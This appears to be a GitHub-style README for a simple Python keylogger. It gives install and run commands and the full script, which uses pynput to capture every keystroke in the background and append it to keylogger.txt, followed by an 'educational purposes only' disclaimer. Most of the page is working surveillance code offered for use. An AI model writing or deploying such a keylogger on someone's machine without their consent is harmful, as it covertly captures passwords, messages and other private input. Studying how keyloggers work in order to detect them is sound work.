Overview
This is a simple keylogger implemented in Python using the pynput library. It captures keystrokes and logs them to a text file.

Features
Logs all keystrokes
Saves captured keystrokes to keylogger.txt
Runs in the background until manually stopped

Install the modules: pip install pynput

Usage: Run the script using:

sh
Copy
Edit
python keylogger.py
Keystrokes will be logged in keylogger.txt.

Code Explanation:
The script listens for keystrokes and writes them to keylogger.txt. It handles exceptions for non-character keys.

python
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keylogger.txt", "a") as f:
        try:
            char = key.char
            f.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
Disclaimer
This script is for educational purposes only. Unauthorized use of keyloggers is illegal and unethical. Use responsibly and with proper consent.

License
This project is licensed under the MIT License.
